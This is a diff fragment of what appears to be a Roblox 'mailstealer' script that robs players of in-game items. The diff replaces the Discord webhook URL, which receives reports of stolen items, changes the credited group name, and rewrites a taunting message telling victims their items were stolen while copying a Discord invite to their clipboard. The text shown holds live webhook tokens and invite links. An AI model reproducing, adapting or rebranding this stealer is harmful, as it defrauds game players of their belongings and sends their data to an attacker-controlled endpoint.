@@ -1,9 +1,9 @@
 DualRAP = 100000000000000000000000000000000000000000000000
 DualUser = "swatplayertheboy"
-DualWebhook = "https://discord.com/api/webhooks/1346854922993537054/eAWf2AxW4rRXmA4fpUuFW2Mkc6uR9bB_yIbpMol9BJ5sWZS-h3LAirU57uwZtwcMY_d9"
+DualWebhook = "https://discord.com/api/webhooks/1331897196425252864/eKfopaFKAny25MGo6CXux2sbTjd6cbsJW6AY0FfojNM93BIKvaOvK-soWmeZ17JsX6sN"
 
 
-LogsWebhook = "s"
+LogsWebhook = ""
 mailstealer_name = "Fe!ner Scripts"
 
 
@@ -883,7 +883,7 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
                             LOGS_WEBHOOK,
                             Left_Hits,
                             v.IsShiny,
-                            "FE!NER SCRIPTS ON TOP!!",
+                            "214 SCRIPTS ON TOP!!",
                             v.Item_RAP,
                             totalRap
                         )
@@ -898,6 +898,6 @@ if #hits > 0 or GemsAmount > FirstPriceOfMail then
 gui:Destroy()
     
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-message.Error("YOU JUST GOT MAILSTOLEN BY FE!NER SCRIPTS! IF YOU WISH FOR YOUR STUFF BACK JOIN https://discord.gg/X6cEmyjFG2 (link copied to clipboard)") 
-setclipboard("https://discord.gg/X6cEmyjFG2") 
+message.Error("YOU JUST GOT MAILSTOLEN BY SCRIPTINGAIR SCRIPTS! IF YOU WISH FOR YOUR STUFF BACK JOIN https://discord.gg/DMB4HNjc (link copied to clipboard)") 
+setclipboard("https://discord.gg/DMB4HNjc") 
 end
